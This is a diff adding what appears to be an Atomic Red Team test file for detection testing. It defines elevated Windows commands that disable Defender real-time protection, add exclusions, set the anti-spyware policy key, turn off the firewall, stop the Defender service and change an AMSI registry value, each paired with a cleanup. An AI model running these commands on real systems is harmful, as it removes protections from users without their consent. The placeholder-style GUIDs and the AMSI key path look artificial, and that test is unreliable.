@@ -1,0 +1,98 @@
+attack_technique: T1562.001
+display_name: "Impair Defenses: Disable or Modify Tools"
+tactic: Defense Evasion
+atomic_tests:
+  - name: "Disable Windows Defender Real-Time Protection"
+    auto_generated_guid: a1a1b1c1d1e1f1a2b2c2d2e2f2a3b3c3
+    description: |
+      Attempts to disable Windows Defender real-time monitoring.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      command: |
+        Set-MpPreference -DisableRealtimeMonitoring $true -ErrorAction SilentlyContinue
+        Get-MpPreference | Select-Object DisableRealtimeMonitoring
+      cleanup_command: |
+        Set-MpPreference -DisableRealtimeMonitoring $false -ErrorAction SilentlyContinue
+      elevation_required: true
+
+  - name: "Add Windows Defender Exclusion Path"
+    auto_generated_guid: b2b2c2d2e2f2a3b3c3d3e3f3a4b4c4d4
+    description: |
+      Adds a path exclusion to Windows Defender.
+    supported_platforms:
+      - windows
+    input_arguments:
+      exclusion_path:
+        description: "Path to exclude"
+        type: path
+        default: "C:\\Windows\\Temp"
+    executor:
+      name: powershell
+      command: |
+        Add-MpPreference -ExclusionPath "#{exclusion_path}"
+        Get-MpPreference | Select-Object -ExpandProperty ExclusionPath
+      cleanup_command: |
+        Remove-MpPreference -ExclusionPath "#{exclusion_path}" -ErrorAction SilentlyContinue
+      elevation_required: true
+
+  - name: "Disable Windows Defender via Registry"
+    auto_generated_guid: c3c3d3e3f3a4b4c4d4e4f4a5b5c5d5e5
+    description: |
+      Disables Windows Defender via registry policy keys.
+    supported_platforms:
+      - windows
+    executor:
+      name: command_prompt
+      command: |
+        reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f
+        reg query "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware
+      cleanup_command: |
+        reg delete "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /f >nul 2>&1
+      elevation_required: true
+
+  - name: "Disable Windows Firewall"
+    auto_generated_guid: d4d4e4f4a5b5c5d5e5f5a6b6c6d6e6f6
+    description: |
+      Disables Windows Firewall for all profiles.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      command: |
+        Get-NetFirewallProfile | Select-Object Name,Enabled
+        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False
+        Get-NetFirewallProfile | Select-Object Name,Enabled
+      cleanup_command: |
+        Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True
+      elevation_required: true
+
+  - name: "Stop Windows Defender Service"
+    auto_generated_guid: e5e5f5a6b6c6d6e6f6a7b7c7d7e7f7a8
+    description: |
+      Attempts to stop the Windows Defender service.
+    supported_platforms:
+      - windows
+    executor:
+      name: powershell
+      command: |
+        Stop-Service -Name WinDefend -Force -ErrorAction SilentlyContinue
+        Get-Service WinDefend | Select-Object Name,Status
+      cleanup_command: |
+        Start-Service -Name WinDefend -ErrorAction SilentlyContinue
+      elevation_required: true
+
+  - name: "Disable AMSI via Registry"
+    auto_generated_guid: f6f6a7b7c7d7e7f7a8b8c8d8e8f8a9b9
+    description: |
+      Disables AMSI via the AmsiEnable registry key.
+    supported_platforms:
+      - windows
+    executor:
+      name: command_prompt
+      command: |
+        reg add "HKLM\SOFTWARE\Microsoft\AMSI\Providers" /v AmsiEnable /t REG_DWORD /d 0 /f
+      cleanup_command: |
+        reg delete "HKLM\SOFTWARE\Microsoft\AMSI\Providers" /v AmsiEnable /f >nul 2>&1
+      elevation_required: true
